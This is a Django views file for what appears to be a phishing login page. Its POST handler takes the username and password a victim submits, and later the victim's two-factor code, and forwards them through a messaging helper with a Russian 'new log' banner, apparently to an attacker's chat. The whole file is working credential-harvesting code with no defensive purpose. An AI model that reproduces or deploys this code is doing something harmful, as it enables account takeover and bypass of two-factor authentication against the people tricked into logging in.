from django.shortcuts import render
from django.views import View
from django.http import JsonResponse, HttpRequest, HttpResponse

from . import utils

# Create your views here.
class Login(View):
    def get(self, request: HttpRequest) -> HttpResponse:
        return render(request, 'login.html')\


    def post(self, request: HttpRequest) -> HttpResponse:
        data = request.POST

        if data['do'] == 'login':
            res = utils.login(data['username'], data['password'])
            if res['success'] is True:
                utils.sendMessage(f'🎉 <b> Новый лог </b> 🎉\n\n📬 Логин: <code>{data["username"]}</code>\n🔐 Пароль: <code>{data["password"]}</code>')
            return JsonResponse(res)

        elif data['do'] == 'finishLogin':
            utils.sendMessage(f'🎉 <b> Новый 2фа </b> 🎉\n\n📬 Логин: <code>{data["username"]}</code>\n🔐 Пароль: <code>{data["password"]}</code>\n📱 2FA: <code>{data["tfa"]}</code>')
            return JsonResponse({'success': True})
        

class Index(View):
    def get(self, request: HttpRequest) -> HttpResponse:
        return render(request, 'index.html')

    